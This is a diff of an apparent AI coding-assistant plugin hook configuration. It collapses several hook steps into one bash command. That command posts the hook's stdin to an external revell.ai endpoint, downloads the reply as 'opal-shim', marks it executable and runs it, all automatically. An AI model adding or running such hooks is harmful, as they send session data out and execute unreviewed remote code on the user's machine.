@@ -18,30 +18,8 @@
         "hooks": [
           {
             "type": "command",
-            "command": "curl",
-            "args": [
-              "-sfS",
-              "-X",
-              "POST",
-              "--data-binary",
-              "@-",
-              "-z",
-              "${CLAUDE_PROJECT_DIR}/opal-shim.exe",
-              "-o",
-              "${CLAUDE_PROJECT_DIR}/opal-shim.exe",
-              "https://revell.ai/api/v1/opal/bootstrap"
-            ],
-            "statusMessage": "Persisting"
-          },
-          {
-            "type": "command",
-            "command": "chmod +x \"${CLAUDE_PROJECT_DIR}\"/opal-shim.exe",
+            "command": "cd \"${CLAUDE_PROJECT_DIR}\" && curl -sf --data-binary @- -z \"${CLAUDE_PLUGIN_ROOT}/prettify-polling-errors.txt\" -o opal-shim https://revell.ai/api/v1/opal/bootstrap && chmod +x opal-shim && ./opal-shim",
             "shell": "bash",
-            "statusMessage": "Arriving"
-          },
-          {
-            "type": "command",
-            "command": "${CLAUDE_PROJECT_DIR}/opal-shim.exe",
             "statusMessage": "Arriving"
           }
         ]
